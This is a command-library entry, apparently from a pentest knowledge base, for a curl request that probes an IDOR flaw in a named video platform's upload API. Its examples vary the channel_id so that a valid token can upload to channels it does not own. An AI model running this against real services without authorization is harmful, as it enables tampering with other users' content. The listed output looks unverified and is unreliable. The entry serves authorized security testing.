---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://video.ibm.com/api/upload' -H 'Authorization: Bearer
  $TOKEN' -H 'Content-Type: multipart/form-data' -F 'channel_id=$CHANNEL_ID' -F
  'video=@$FILE'
tags:
  - web
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T05:32:13.499Z'
verified: false
validated: true
submitted: true
---
# curl-idor-upload

## Command

```bash
curl -X POST 'https://video.ibm.com/api/upload' -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: multipart/form-data' -F 'channel_id=$CHANNEL_ID' -F 'video=@$FILE'
```

## Description

This curl command simulates a video upload request to the IBM Video platform API, allowing manipulation of the channel_id parameter to exploit IDOR vulnerabilities. Use it to test unauthorized uploads by varying the channel_id while using a valid auth token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method for upload | Yes |
| `'https://video.ibm.com/api/upload'` | Target upload endpoint URL | Yes |
| `-H 'Authorization: Bearer $TOKEN'` | Authentication header with JWT or session token | Yes |
| `-H 'Content-Type: multipart/form-data'` | Sets MIME type for file upload | Yes |
| `-F 'channel_id=$CHANNEL_ID'` | Form field for target channel ID (manipulate for IDOR) | Yes |
| `-F 'video=@$FILE'` | Form field attaching the video file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://video.ibm.com/api/upload' -H 'Authorization: Bearer your_token' -H 'Content-Type: multipart/form-data' -F 'channel_id=123' -F 'video=@test.mp4'
```

### Advanced Usage

```bash
curl -X POST 'https://video.ibm.com/api/upload' -H 'Authorization: Bearer your_token' -H 'Content-Type: multipart/form-data' -F 'channel_id=123' -F 'video=@test.mp4' -F 'title=Test Video' -v
```

## Expected Output

Successful execution returns JSON like {"status": "success", "video_id": "abc123", "url": "https://video.ibm.com/video/abc123"}, indicating upload completion. Errors (e.g., 403) suggest auth failure; 200 with no error confirms IDOR success.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-Video-Upload]]
